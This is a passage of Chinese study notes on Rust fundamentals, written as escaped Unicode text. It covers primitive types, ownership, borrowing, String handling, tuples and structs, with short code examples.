\u4e2d\u53ef\u4ee5\u91cd\u590d\u58f0\u660e\u540c\u4e00\u540d\u79f0\u7684\u53d8\u91cf\uff0c\u8fd9\u4f1a\u518d\u6b21\u5206\u914d\u5185\u5b58\uff0c\u5e76\u5b8c\u5168\u906e\u853d\u6389\u524d\u9762\u7684\u540c\u540d\u53d8\u91cf \u57fa\u672c\u7c7b\u578b \u00b6 \u6574\u578b \u00b6 i \u957f\u5ea6 \uff08\u6709\u7b26\u53f7\uff09\u3001u \u957f\u5ea6 \uff08\u65e0\u7b26\u53f7\uff09 i8\u3001i16\u3001i32\u3001i64\u3001i128\u3001u8\u3001u16\u3001u32\u3001u64\u3001u128 isize\u3001usize \u957f\u5ea6\u7531 CPU \u51b3\u5b9a\uff0c32 \u4f4d CPU \u5219\u662f 32 \u4f4d\uff0c64 \u4f4d CPU \u5219\u662f 64 \u4f4d \u6574\u578b\u5b57\u9762\u91cf\u4e2d\u95f4\u53ef\u4ee5\u63d2\u5165 _ \u5b57\u9762\u91cf\u7ed3\u5c3e\u53ef\u4ee5\u63a5\u7c7b\u578b\uff0c\u4f8b\u5982 10 i32 , 10_ i32 \u5b57\u9762\u91cf\uff0c\u5341\u516d\u8fdb\u5236 0x...\u3001\u516b\u8fdb\u5236 0o...\u3001\u4e8c\u8fdb\u5236 0b...\u3001\u5b57\u8282\uff08\u4ec5 u8\uff09b'A' \u6574\u578b\u9ed8\u8ba4\u4f7f\u7528 i32 \u7c7b\u578b \u4f7f\u7528 as \u6765\u8f6c\u6362\u7c7b\u578b\uff0c\u4f8b\u5982 let a : u16 = 1_ u8 as u16 ; debug \u6a21\u5f0f\u7f16\u8bd1\u65f6\u4ea7\u751f\u6ea2\u51fa\u4f1a panic\uff0c\u800c\u5728 release \u6a21\u5f0f\u4e0b\u5219\u4e0d\u4f1a panic\uff0c\u6309\u7167\u8865\u7801\u5faa\u73af\u6ea2\u51fa\u3002\u4f46\u4e0d\u80fd\u4f9d\u8d56\u8fd9\u79cd\u884c\u4e3a\uff0c\u60f3\u8981\u8fd9\u6837\u7684\u6548\u679c\u5e94\u8be5\u6807\u51c6\u5e93\u7684\u4e00\u4e9b\u65b9\u6cd5\uff1a wrapping_ * \u65b9\u6cd5\uff0c\u6309\u7167\u8865\u7801\u5faa\u73af\u6ea2\u51fa\uff0c\u4f8b\u5982 a . wrapping_add ( 1 ) checked_ * \u65b9\u6cd5\uff0c\u5982\u679c\u4ea7\u751f\u6ea2\u51fa\u4e86\uff0c\u5219\u4f1a\u8fd4\u56de None overflowing_ * \u65b9\u6cd5\uff0c\u8fd4\u56de\u7ed3\u679c\u4ee5\u53ca\u6307\u793a\u662f\u5426\u6ea2\u51fa\u7684\u5e03\u5c14\u503c saturating_ * \u65b9\u6cd5\uff0c\u5982\u679c\u4f1a\u6ea2\u51fa\u5219\u4fdd\u6301\u5728\u6700\u5927/\u6700\u5c0f\u503c\u4e0a \u5e03\u5c14\u7c7b\u578b \u00b6 \u7c7b\u578b\u540d\u4e3a bool\uff0c\u503c\u4e3a true \u6216 false\uff0c\u5360\u7528 1 \u5b57\u8282\u5185\u5b58 \u6d6e\u70b9\u578b \u00b6 f32 \u5355\u7cbe\u5ea6\u6d6e\u70b9\u578b\u3001f64 \u53cc\u7cbe\u5ea6\u6d6e\u70b9\u578b\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4e3a f64 \u5e94\u8be5\u907f\u514d\u5224\u65ad\u6d6e\u70b9\u6570\u76f8\u7b49 \u53ef\u4ee5\u4f7f\u7528 .is_nan() \u65b9\u6cd5\u6765\u5224\u65ad\u4e00\u4e2a\u6570\u503c\u662f\u5426\u662f NaN \u6570\u503c\u4e0a\u4e5f\u53ef\u4ee5\u4f7f\u7528\u65b9\u6cd5\uff0c\u6bd4\u5982 3.14_ f32 . round () \u8fd0\u7b97 \u00b6 + - * / % \uff1a\u52a0\u51cf\u4e58\u9664\u53d6\u6a21 & | ^ ! << >> \uff1a\u4f4d\u8fd0\u7b97 \u540c\u6837\u7c7b\u578b\u624d\u80fd\u8fdb\u884c\u8ba1\u7b97\u3001\u7c7b\u578b\u8f6c\u6362\u5fc5\u987b\u662f\u663e\u5f0f\u7684 \u5176\u5b83\u8fd0\u7b97\u53ef\u4ee5\u901a\u8fc7\u65b9\u6cd5\u5b9e\u73b0\uff0c.pow() \u8ba1\u7b97\u6307\u6570\uff0c.log() \u53d6\u5bf9\u6570\u3001.div_euclid() \u6574\u9664\u3001.div_floor() \u7b49\u7b49 \u5e8f\u5217 \u00b6 \u5728 for \u5faa\u73af\u4e2d\u5e38\u7528\uff0c\u7528\u6765\u751f\u6210\u8fde\u7eed\u7684\u6570\u503c\uff0c\u4ec5\u53ef\u4ee5\u4f7f\u7528\u6574\u6570\u3001\u5b57\u7b26\u7b49\u8fde\u7eed\u7684\u7c7b\u578b\uff0c\u4f8b\u5982\uff1a for i in 1 .. 5 { .. .; // i = 1, 2, 3, 4 } for j in 'a' ..= 'd' { .. .; // i = 'a', 'b', 'c', 'd' } \u5b57\u7b26\u7c7b\u578b \u00b6 rust \u4e2d\u7684\u5b57\u7b26\u7c7b\u578b\u662f char\uff0c\u5b57\u9762\u91cf\u5199\u6cd5\u4e3a\u5355\u5f15\u53f7\uff08\u53cc\u5f15\u53f7\u8868\u793a\u5b57\u7b26\u4e32\uff09 \u4e00\u4e2a char \u5360\u56db\u4e2a\u5b57\u8282\uff08\u800c\u4e0d\u662f C/C++ \u4e2d\u7684\u4e00\u4e2a\u5b57\u8282\uff09 \u6240\u6709 unicode \u7801\u5143\u90fd\u662f\u4e00\u4e2a\u5b57\u7b26 \u76f4\u63a5\u5b58\u50a8 unicode \u503c\uff08\u5373 UCS-4\uff09\uff0c\u800c\u4e0d\u4f7f\u7528 UTF-8 \u7f16\u7801 \u5355\u5143\u7c7b\u578b \u00b6 \u5355\u5143\u7c7b\u578b\u5c31\u662f ()\uff0c\u552f\u4e00\u7684\u503c\u4e5f\u662f ()\uff0c\u4e0d\u5360\u5185\u5b58 main \u51fd\u6570\u8fd4\u56de\u7684\u5c31\u662f\u5355\u5143\u7c7b\u578b () \u8bed\u53e5\u4e0e\u8868\u8fbe\u5f0f \u00b6 \u7b80\u5355\u7406\u89e3\u5c31\u662f\uff0c\u5e26\u5206\u53f7\u7684\u662f\u4e00\u4e2a\u8bed\u53e5\uff0c\u4e0d\u5e26\u5206\u53f7\u7684\u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f\uff0c\u80fd\u8fd4\u56de\u503c\u7684\u5c31\u662f\u8868\u8fbe\u5f0f \u8868\u8fbe\u5f0f\u53ef\u4ee5\u662f\u8bed\u53e5\u7684\u4e00\u90e8\u5206\uff0c\u6bd4\u5982 let a = 1 ; \u4e2d 1 \u5c31\u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f\uff0c\u800c\u6574\u4f53\u662f\u4e00\u4e2a\u8bed\u53e5 \u51fd\u6570\u8c03\u7528\u662f\u8868\u8fbe\u5f0f\uff0c\u56e0\u4e3a\u4f1a\u6709\u8fd4\u56de\u503c\uff0c\u5373\u4f7f\u201c\u65e0\u201d\u8fd4\u56de\u503c\u4e5f\u4f1a\u8fd4\u56de\u5355\u5143\u7c7b\u578b \u7528\u5927\u62ec\u53f7\u5305\u88f9\u7684\u8fd4\u56de\u4e00\u4e2a\u503c\u7684\u8bed\u53e5\u5757\u4e5f\u662f\u8868\u8fbe\u5f0f\uff1a let a = { let b = 1 ; b + 1 }; \u51fd\u6570 \u00b6 fn add ( i : i32 , j : i32 ) -> i32 { i + j // \u4e0d\u5e26\u5206\u53f7\uff0c\u8fd4\u56de\u503c\uff1b\u5e26\u5206\u53f7\u4e86\u4f1a\u8fd4\u56de () } \u5b9a\u4e49\u51fd\u6570\u4f7f\u7528\u5173\u952e\u5b57 fn \u51fd\u6570\u540d\u3001\u53c2\u6570\u540d\u4f7f\u7528\u86c7\u5f62\u547d\u540d \u5fc5\u987b\u663e\u5f0f\u6307\u5b9a\u53c2\u6570\u7c7b\u578b\uff0c\u9664\u4e86\u8fd4\u56de () \u5916\u8981\u663e\u5f0f\u6307\u5b9a\u8fd4\u56de\u503c\u7c7b\u578b \u4e2d\u9014\u8fd4\u56de\u4f7f\u7528 return \u5173\u952e\u5b57\uff08\u5e26\u4e0d\u5e26\u5206\u53f7\u5747\u53ef\uff09 \u6c38\u4e0d\u8fd4\u56de\u7684\u51fd\u6570\u7c7b\u578b\u4e3a !\uff08\u76f8\u5f53\u4e8e python \u7c7b\u578b\u6807\u6ce8\u4e2d\u7684 NoReturn\uff09\uff0c\u4e00\u822c\u7528\u4e8e\u4e00\u5b9a\u4f1a\u629b\u51fa panic \u7684\u51fd\u6570\u6216\u8005\u65e0\u9650\u5faa\u73af\uff1a fn dead_end () -> ! { panic! ( \"...\" ); } fn forever () -> ! { loop { /*...*/ }; } \u6240\u6709\u6743\u4e0e\u501f\u7528 \u00b6 \u6240\u6709\u6743 \u00b6 Rust \u4e2d\u6bcf\u4e00\u4e2a\u503c\u90fd\u88ab\u4e00\u4e2a\u53d8\u91cf\u6240\u62e5\u6709\uff0c\u8be5\u53d8\u91cf\u88ab\u79f0\u4e3a\u503c\u7684\u6240\u6709\u8005 \u4e00\u4e2a\u503c\u540c\u65f6\u53ea\u80fd\u88ab\u4e00\u4e2a\u53d8\u91cf\u6240\u62e5\u6709\uff0c\u6216\u8005\u8bf4\u4e00\u4e2a\u503c\u53ea\u80fd\u62e5\u6709\u4e00\u4e2a\u6240\u6709\u8005 \u5f53\u6240\u6709\u8005\uff08\u53d8\u91cf\uff09\u79bb\u5f00\u4f5c\u7528\u57df\u8303\u56f4\u65f6\uff0c\u8fd9\u4e2a\u503c\u5c06\u88ab\u4e22\u5f03\uff08drop\uff09 \u5176\u4e2d\u4f5c\u7528\u57df\u7684\u6982\u5ff5\u548c\u5176\u4ed6\u8bed\u8a00\u7c7b\u4f3c String \u7c7b\u578b \u00b6 let s = \"abc\" \u4e2d s \u7684\u7c7b\u578b\u4e3a & str \uff0c\u5e76\u4e0d\u662f String\uff0c\"abc\" \u662f\u88ab\u786c\u7f16\u7801\u7684\u4e0d\u53ef\u53d8\u7684\u5b57\u9762\u91cf\u3002\u5b58\u50a8\u7684\u65f6\u5019\u662f\u4e00\u4e2a\u6307\u9488\u548c\u5b57\u7b26\u4e32\u957f\u5ea6 \u800c String \u5219\u662f\u901a\u8fc7\u5806\u6765\u52a8\u6001\u5206\u914d\u5185\u5b58\u3002\u6bd4\u5982 let s = String :: from ( \"abc\" ) \uff0c\u8c03\u7528 String \u7684 from \u65b9\u6cd5\u6765\u521b\u5efa\u4e00\u4e2a String \u5982\u679c s \u662f mut \u7684\uff0c\u5219\u53ef\u4ee5\u901a\u8fc7 s . push_str ( \"...\" ) \u6765\u8ffd\u52a0\u5b57\u9762\u91cf \u6240\u6709\u6743\u8f6c\u79fb \u00b6 let x = 1 ; let y = x ; \u56e0\u4e3a i32 \u5b58\u50a8\u5728\u6808\u4e0a\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u62f7\u8d1d\uff0cx \u548c y \u90fd\u4e3a 1\uff0c\u4f46 let x = String :: from ( \"abc\" ); let y = x ; String \u5b58\u50a8\u5728\u5806\u4e0a\uff0c\u4e3a y \u8d4b\u503c\u672c\u5e94\u62f7\u8d1d\u5730\u5740\u4f5c\u6d45\u590d\u5236\uff0c\u4f46\u8fd9\u6837\u540c\u4e00\u4e2a String \u5c31\u6709\u4e86\u4e24\u4e2a\u6240\u6709\u8005\uff08x \u548c y\uff09\uff0c\u8fd9\u662f\u6240\u6709\u6743\u89c4\u5219\u4e0d\u5141\u8bb8\u7684\u3002\u56e0\u6b64\u8fd9\u65f6 x \u4f1a\u5931\u6548\uff0c\u4e5f\u5c31\u662f\u5c06 String \u7684\u6240\u6709\u6743\u8f6c\u79fb\u7ed9 y\uff0c\u540e\u9762\u65e0\u6cd5\u518d\u4f7f\u7528 x \u53d8\u91cf\u3002\u8fd9\u79cd\u64cd\u4f5c\u53eb\u505a\u79fb\u52a8\uff08move\uff09\u800c\u975e\u62f7\u8d1d let x : & str = \"abc\" ; let y = x ; \u8fd9\u79cd\u60c5\u51b5\uff0c\u56e0\u4e3a\u4f7f\u7528\u7684\u662f &str \u800c\u4e0d\u662f String\uff0c\u6240\u4ee5 x \u4ec5\u5f15\u7528\u4e86\u5b58\u50a8\u5728\u5185\u5b58\u4e2d\u7684\u5b57\u7b26\u4e32\uff0c\u5e76\u4e0d\u5bf9\u5b83\u6301\u6709\u6240\u6709\u6743\uff0c\u56e0\u6b64 let y = x \u65f6\u5bf9\u5b58\u5728\u6808\u4e0a\u7684\u5f15\u7528\u8fdb\u884c\u4e86\u62f7\u8d1d\uff0c\u800c\u4e0d\u9700\u8981\u79fb\u52a8\u3002\u6240\u4ee5\u8fd9\u4e4b\u540e x \u548c y \u5747\u53ef\u7528 rust \u6c38\u8fdc\u4e0d\u4f1a\u81ea\u52a8\u521b\u5efa\u6570\u636e\u7684\u6df1\u62f7\u8d1d \u4f7f\u7528 .clone() \u53ef\u4ee5\u6df1\u62f7\u8d1d\u5b58\u5728\u5806\u4e0a\u7684\u6570\u636e\uff0c\u4f46\u6027\u80fd\u964d\u4f4e let x = String :: from ( \"abc\" ); let y = x . clone (); // \u540e\u9762 x\u3001y \u5747\u53ef\u7528\uff0c\u56e0\u4e3a\u662f\u6240\u6709\u7684\u662f\u4e0d\u540c\u6570\u636e \u51fd\u6570\u4f20\u503c\u4e0e\u8fd4\u56de \u00b6 \u5411\u51fd\u6570\u4e2d\u4f20\u503c\u4e5f\u4f1a\u53d1\u751f\u79fb\u52a8\u6216\u8005\u590d\u5236 fn main () { let s = String :: from ( \"abc\" ); print ( s ); // \u8fd9\u91cc s \u5c06\u4e0d\u80fd\u4f7f\u7528 } fn print ( string : String ) { println! ( \"{}\" , string ); // s \u7684\u6240\u6709\u6743\u5230\u8fd9\u91cc } // string \u88ab\u91ca\u653e \u4ece\u4e0a\u9762\u7684\u4f8b\u5b50\u53ef\u4ee5\u770b\u51fa\uff0cs \u5bf9\u4e8e String \u7684\u6240\u6709\u6743\u5728\u51fd\u6570\u4f20\u503c\u8c03\u7528\u65f6\u88ab\u79fb\u52a8\u7ed9\u4e86 print \u51fd\u6570\u7684 string \u53d8\u91cf\u3002\u7136\u540e\u968f\u7740 print \u51fd\u6570\u7684\u7ed3\u675f\uff0cstring \u4f5c\u7528\u57df\u7ed3\u675f\uff0c\u8fd9\u4e2a\u503c\u5185\u5b58\u88ab drop\u3002\u5e76\u4e14\u7531\u4e8e\u5728\u8c03\u7528\u65f6 s \u88ab\u79fb\u52a8\u4e86\uff0c\u6240\u4ee5\u5728\u8c03\u7528\u540e s \u5c06\u4e0d\u80fd\u88ab\u4f7f\u7528\u3002\u82e5\u60f3\u5728\u8c03\u7528\u540e\u7ee7\u7eed\u4f7f\u7528 s\uff0c\u4e00\u79cd\u65b9\u6cd5\u662f\u5c06 s.clone() \u4f20\u7ed9 print\uff0c\u53e6\u4e00\u79cd\u65b9\u6cd5\u5219\u662f\u5229\u7528\u8fd4\u56de\uff1a fn main () { let mut s = String :: from ( \"abc\" ); s = print ( s ); println! ( \"{}\" , s ); // \u8fd9\u91cc s \u53ef\u7528 } fn print ( string : String ) -> String { println! ( \"{}\" , string ); string } \u51fd\u6570\u5728\u8fd4\u56de\u7684\u65f6\u5019\u4e5f\u4f1a\u79fb\u52a8\u6240\u6709\u6743\uff0c\u6bd4\u5982\u4e0a\u9762\u4f8b\u5b50\u4e2d\uff0cprint \u51fd\u6570\u7ed3\u675f\u540e\uff0c\u5c06 string \u79fb\u52a8\u4e86\u51fa\u53bb\uff0c\u8d4b\u503c\u7ed9\u4e86 s\uff0c\u8fd9\u65f6 s \u5c31\u62ff\u5230\u4e86\u8fd4\u56de\u503c\u7684\u6240\u6709\u6743\uff0c\u540e\u9762\u4ecd\u53ef\u4ee5\u7ee7\u7eed\u4f7f\u7528\u3002\u4f46\u8fd9\u8981\u6c42 s \u662f mut \u7684\uff08\u56e0\u4e3a\u53d1\u751f\u4e86\u53d8\u5316\uff09\uff0c\u6216\u8005\u4f7f\u7528\u53d8\u91cf\u906e\u853d\uff08 let s = print ( s ) \uff09 \u5f15\u7528\u4e0e\u501f\u7528 \u00b6 rust \u4e2d\u4e5f\u6709\u5f15\u7528\u7684\u6982\u5ff5\uff0c\u83b7\u53d6\u4e00\u4e2a\u53d8\u91cf\u7684\u5f15\u7528\u4e5f\u79f0\u4e3a\u501f\u7528\uff08borrowing\uff09\uff0c\u4f7f\u7528 & \u6765\u8fdb\u884c\u5f15\u7528\uff0c* \u6765\u89e3\u5f15\u7528\uff1a let x : i32 = 1 ; let y : & i32 = & x ; // \u5f15\u7528\u7c7b\u578b assert_eq! ( x , * y ); \u4e5f\u53ef\u4ee5\u901a\u8fc7\u501f\u7528\u6765\u8fdb\u884c\u51fd\u6570\u8c03\u7528\uff0c\u4ece\u800c\u7ef4\u6301\u53c2\u6570\u7684\u6240\u6709\u6743\uff1a fn main () { let s = String :: from ( \"abc\" ); let len = func ( & s ); // \u521b\u5efa s \u7684\u5f15\u7528\uff0c\u5e76\u4f20\u5165 println! ( \"{} {}\" , s , len ); // s \u4ecd\u53ef\u7528 } fn func ( string : & String ) -> usize { // \u63a5\u6536\u5f15\u7528 string . len () // \u76f4\u63a5\u8c03\u7528\u65b9\u6cd5 } // string \u79bb\u5f00\u4f5c\u7528\u57df\uff0c\u4f46\u5b83\u5e76\u4e0d\u62e5\u6709\u4efb\u4f55\u503c\uff0c\u6240\u4ee5\u4e0d\u4f1a\u53d1\u751f\u4ec0\u4e48 \u4f46\u662f\u6b64\u65f6\u7684\u5f15\u7528\u662f\u4e0d\u53ef\u53d8\u5f15\u7528\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u4e0d\u80fd\u5728 func \u51fd\u6570\u4e2d\u8fdb\u884c string . push_str ( \"...\" ) \u4f7f\u7528 &mut \u53ef\u4ee5\u521b\u5efa\u53ef\u53d8\u5f15\u7528\uff0c\u4f8b\u5982\uff1a let mut x : i32 = 1 ; let y : & mut i32 = & mut x ; fn main () { let mut s = String :: from ( \"abc\" ); func ( & mut s ); // \u521b\u5efa s \u7684\u53ef\u53d8\u5f15\u7528 println! ( \"{}\" , s ) // \u8f93\u51fa abc... } fn func ( string : & mut String ) { // \u63a5\u6536\u53ef\u53d8\u5f15\u7528 string . push_str ( \"...\" ) // \u53ef\u4ee5\u8fdb\u884c\u66f4\u6539 } \u4f46\u662f\u5bf9\u4e8e\u53ef\u53d8\u5f15\u7528\uff0crust \u6709\u4e00\u4e9b\u9650\u5236\uff1a \u5728\u540c\u4e00\u4e2a\u4f5c\u7528\u57df\u5185\uff0c\u4e00\u4e2a\u6570\u636e\u53ea\u80fd\u6709\u4e00\u4e2a\u53ef\u53d8\u5f15\u7528 \u53ef\u53d8\u5f15\u7528\u548c\u4e0d\u53ef\u53d8\u5f15\u7528\u4e0d\u80fd\u540c\u65f6\u5b58\u5728 \u8fd9\u6837\u505a\u7684\u76ee\u7684\u662f\u907f\u514d\u4ea7\u751f\u6570\u636e\u7ade\u4e89\uff0c\u4ee5\u53ca\u9632\u6b62\u4e0d\u53ef\u53d8\u5f15\u7528\u7684\u503c\u88ab\u53ef\u53d8\u5f15\u7528\u6240\u6539\u53d8 \u4ee5\u53ca\u5982\u679c\u5b58\u5728\u5f15\u7528\uff0c\u4e14\u540e\u9762\u7528\u5230\u4e86\u8fd9\u4e2a\u5f15\u7528\uff0c\u5219\u88ab\u5f15\u7528\u7684\u5373\u4f7f\u662f mut \u7684\uff0c\u4e5f\u4e0d\u80fd\u88ab\u4fee\u6539\uff0c\u4f8b\u5982\uff1a fn main () { let mut x = 1 ; let y = & x ; //borrow later used here println! ( \"{}, {}\" , x , * y ); x = 2 ; // assignment to borrowed `x` occurs here println! ( \"{}, {}\" , x , * y ); // borrow later used here } \u5219\u4f1a\u4ea7\u751f\u5982\u4e0a\u6ce8\u91ca\u4e2d\u7684\u9519\u8bef\uff0c\u800c\u5982\u679c\u5728 x = 2 \u540e\u9762\u6ca1\u6709\u518d\u7528\u5230 y\uff0c\u5219\u662f\u53ef\u4ee5\u901a\u8fc7\u7f16\u8bd1\u6b63\u5e38\u66f4\u6539 x \u7684 \u4ee5\u53ca\u5982\u4e0b\u4ee3\u7801\u4e5f\u4f1a\u7f16\u8bd1\u9519\u8bef\uff1a fn main () { let mut x = 1 ; let y = & mut x ; println! ( \"{}, {}\" , x , * y ); // cannot borrow `x` as immutable because it is also borrowed as mutable } \u56e0\u4e3a\u5728\u4f20\u5165\u5b8f\u65f6\uff0c\u5b9e\u9645\u4e0a\u5bf9 x \u8fdb\u884c\u4e86\u501f\u7528\uff0c\u56e0\u6b64\u540c\u65f6\u5b58\u5728\u4e86\u53ef\u53d8\u548c\u4e0d\u53ef\u53d8\u7684\u5f15\u7528\uff0c\u5bfc\u81f4\u62a5\u9519 \u907f\u514d\u60ac\u5782\u5f15\u7528 \u00b6 \u60ac\u5782\u5f15\u7528\uff08dangling references\uff09\u4e5f\u79f0\u60ac\u5782\u6307\u9488\uff0c\u610f\u601d\u662f\u6307\u9488\u6307\u5411\u7684\u503c\u88ab\u91ca\u653e\u6389\u4e86\uff0c\u5bfc\u81f4\u6307\u9488\u6307\u7684\u4f4d\u7f6e\u4e0d\u5b58\u5728\u671f\u671b\u7684\u5185\u5bb9\u3002rust \u4e0d\u4f1a\u5141\u8bb8\u8fd9\u79cd\u60c5\u51b5\u53d1\u751f\uff0c\u6bd4\u5982 fn dangle () -> & String { let s = String :: from ( \"abc\" ); & s } \u8fd9\u91cc\u8fd4\u56de\u4e86 s \u7684\u5f15\u7528\uff0c\u4f46\u662f\u5728\u51fd\u6570\u7ed3\u675f\u540e s \u79bb\u5f00\u4e86\u4f5c\u7528\u57df\uff0c\u88ab\u91ca\u653e\u6389\u4e86\uff0c\u6240\u4ee5\u8fd4\u56de\u7684\u5176\u5b9e\u662f\u60ac\u5782\u5f15\u7528\uff0crust \u7f16\u8bd1\u5668\u5c06\u4e0d\u4f1a\u901a\u8fc7 \u590d\u5408\u7c7b\u578b \u00b6 \u5b57\u7b26\u4e32 \u00b6 &str \u4e0e String \u662f\u4e24\u4e2a\u4e0d\u540c\u7684\u7c7b\u578b \u53ef\u4ee5\u4f7f\u7528 &s[a..b] \u7684\u65b9\u5f0f\u6765\u83b7\u53d6\u5207\u7247\u7684\u5f15\u7528\uff0c\u5207\u7247\u4f7f\u7528\u7684\u662f\u524d\u9762\u7684 range \u7c7b\u578b\uff0c\u8bed\u6cd5\u548c python \u7684\u5207\u7247\u7c7b\u4f3c\uff0c\u540c\u6837\u53ef\u4ee5\u7701\u7565\u5934\u5c3e \u5bf9\u4e00\u4e2a String \u4f7f\u7528\u5207\u7247\u83b7\u5f97\u7684\u5f15\u7528\u7c7b\u578b\u4e5f\u662f &str \u5207\u7247\u662f\u6309\u5b57\u8282\u8fdb\u884c\u7684\uff0c\u9700\u8981\u7cbe\u786e\u5207\u5230\u5b57\u7b26\u8fb9\u754c\u3002\u4f8b\u5982\u5bf9\u4e2d\u6587\u5b57\u7b26\u4e32\u8fdb\u884c\u5207\u7247\uff0c&s[0..3] \u4f1a\u5207\u51fa\u4e00\u4e2a\u6c49\u5b57\u5b57\u7b26\uff0c\u800c &s[0..2] \u6ca1\u5207\u5b8c\u6574\u4f1a\u5bfc\u81f4 panic \u5b57\u7b26\u662f UCS-4 \u7f16\u7801\uff0c\u5b57\u7b26\u4e32\u662f UTF-8 \u7f16\u7801\uff08\u6bcf\u4e2a\u5b57\u7b26\u5b57\u8282\u6570\u4e0d\u5b9a\uff09 String \u4e0e &str \u8f6c\u6362 &str -> String String::from(\"...\") \"...\".to_string() String -> &str &s / &s[..] s.as_str() String \u64cd\u4f5c .push('a') \u8ffd\u52a0\u5b57\u7b26 / .push_str(\"...\") \u8ffd\u52a0\u5b57\u7b26\u4e32 .insert(n, 'a') \u5728\u7d22\u5f15 n \u7684\u4f4d\u7f6e\u63d2\u5165\u5b57\u7b26 / .insert(n, \"...\") \u540c\u7406\u63d2\u5165\u5b57\u7b26\u4e32 .replace(\"aaa\", \"AAA\") \u5168\u5c40\u66ff\u6362\u6240\u6709 \"aaa\" \u5230 \"AAA\"\uff0c\u8fd4\u56de\u66ff\u6362\u540e\u7684\u65b0\u5b57\u7b26\u4e32\uff0c\u539f\u5b57\u7b26\u4e32\u4e0d\u53d8 .replacen(\"aaa\", \"AAA\") \u540c\u4e0a\uff0c\u4f46\u53ea\u66ff\u6362 n \u6b21 .replace_range(a..b, \"...\") \u5c06\u7d22\u5f15 a..b \u7684\u8303\u56f4\u66ff\u6362\u4e3a\u65b0\u5b57\u7b26\u4e32 \"...\"\uff0c\u76f4\u63a5\u64cd\u4f5c\u539f\u5b57\u7b26\u4e32 .pop() \u5220\u9664\u5e76\u8fd4\u56de\u6700\u540e\u4e00\u4e2a\u5b57\u7b26\uff0c\u8fd4\u56de\u503c\u4e3a\u4e00\u4e2a Option\uff0c\u82e5\u5b57\u7b26\u4e32\u4e3a\u7a7a\u5219\u8fd4\u56de None .remove(n) \u5220\u9664\u4ee5\u7d22\u5f15 n \u5f00\u5934\u7684\u4e00\u4e2a\u5b57\u7b26 .truncate(n) \u5220\u9664\u7d22\u5f15 n \u5f00\u5934\u53ca\u4e4b\u540e\u7684\u6240\u6709\u5b57\u7b26 .clear() \u6e05\u7a7a\u5b57\u7b26\u4e32 \u4f7f\u7528 + \u6216 += \u8fde\u63a5\u4e00\u4e2a &str \u5b57\u7b26\u4e32\uff08\u4e0d\u80fd\u662f String\uff09 + \u8fd0\u7b97\u7b26\u5de6\u4fa7\u7684\u53d8\u91cf\u5c06\u5931\u6548\uff0c\u56e0\u4e3a\u6240\u6709\u6743\u8f6c\u79fb\u5230\u4e86 .add() \u65b9\u6cd5\u4e2d\u7136\u540e\u88ab\u91ca\u653e \u53ef\u4ee5\u4f7f\u7528 let s = format!(\"{} {}\", s1, s2) \u6765\u8fde\u63a5\u521b\u5efa\u65b0\u7684\u5b57\u7b26\u4e32 \u5b57\u7b26\u4e32\u8f6c\u4e49 \"\\x..\" \u5341\u516d\u8fdb\u5236\u8868\u793a\uff0c\u5fc5\u987b\u5728 \\x00 \u5230 \\x7f \u4e4b\u95f4 \"\\u{....}\" \u7528 codepoint \u8868\u793a\u4e00\u4e2a unicode \u5b57\u7b26 \u53ef\u4ee5\u76f4\u63a5\u6362\u884c\uff0c\u4f46\u4ece\u4e0b\u4e00\u884c\u884c\u9996\u5f00\u59cb\u5c31\u8bb0\u5f55\u6587\u672c\uff08\u4e5f\u5c31\u662f\u4e0d\u5f53\u4f5c\u7f29\u8fdb\u5ffd\u7565\uff09\uff0c\u884c\u5c3e\u52a0 \u4e0d\u6362\u884c\uff0c\u4e14\u4e0b\u4e00\u884c\u884c\u9996\u7a7a\u683c\u5ffd\u7565 \u5176\u5b83\u8f6c\u4e49\u548c\u5176\u5b83\u8bed\u8a00\u5747\u7c7b\u4f3c r\"...\" \u4e2d\u7684 \u4e0d\u53c2\u4e0e\u8f6c\u4e49\uff08\u548c python \u7c7b\u4f3c\uff09 r#\"...\"# \u4e2d\u7684\u53cc\u5f15\u53f7\u4e0d\u4f1a\u63d0\u524d\u7ed3\u675f\u5b57\u7b26\u4e32\uff08\u4e5f\u5c31\u76f8\u5f53\u4e8e\u4e0d\u9700\u8981\u8f6c\u4e49\u53cc\u5f15\u53f7\uff09 r##\"...\"## \u4e2d\u7684 \"# \u4e5f\u4e0d\u4f1a\u63d0\u524d\u7ed3\u675f\u5b57\u7b26\u4e32\uff08\u53cc\u5f15\u53f7\u524d\u540e\u7684\u4e95\u53f7\u52a0\u591a\u5c11\u90fd\u53ef\u4ee5\uff0c\u53ea\u9700\u8981\u5339\u914d\u5373\u53ef\uff09 \u64cd\u4f5c UTF-8 \u5b57\u7b26\u4e32 \u5faa\u73af\u904d\u5386\u5b57\u7b26\u53ef\u4ee5\u4f7f\u7528 for c in \"...\" . chars () \u5faa\u73af\u904d\u5386\u5b57\u8282\u53ef\u4ee5\u4f7f\u7528 for c in \"...\" . bytes () \u5176\u5b83\u64cd\u4f5c\u6807\u51c6\u5e93\u4e2d\u6ca1\u6709\uff0c\u9700\u8981\u901a\u8fc7\u522b\u7684 crates \u5143\u7ec4 \u00b6 \u957f\u5ea6\u56fa\u5b9a\uff0c\u5143\u7d20\u987a\u5e8f\u53ca\u7c7b\u578b\u56fa\u5b9a\u7684\u590d\u5408\u7c7b\u578b\uff0c\u4f8b\u5982 let t : ( i32 , f64 ) = ( 1 , 1.1 ); \u4f7f\u7528\u6a21\u5f0f\u5339\u914d\u83b7\u53d6\u5143\u7ec4\u4e2d\u7684\u503c\uff1a let ( a , b ) = t ; \u4f7f\u7528 . \u6765\u8bbf\u95ee\u5143\u7ec4\u5185\u5bb9\uff1a t.0 == 1 \u7ed3\u6784\u4f53 \u00b6 \u4f7f\u7528 struct \u5173\u952e\u5b57\u6765\u5b9a\u4e49\u7ed3\u6784\u4f53\uff0c\u6307\u660e\u5b57\u6bb5\u540d\u4e0e\u7c7b\u578b\uff1a struct User { name : String , age : u32 , email : String , } \u521b\u5efa\u7ed3\u6784\u4f53\u5b9e\u4f8b\u65f6\u6bcf\u4e2a\u5b57\u6bb5\u90fd\u9700\u8981\u521d\u59cb\u5316\uff0c\u4e14\u987a\u5e8f\u53ef\u4ee5\u6253\u4e71\uff1a let user1 = User { age : 19_ u32 , name : String :: from ( \"TonyCrane\" ), email : String :: from ( \"tonycrane@foxmail.com\" ), }; 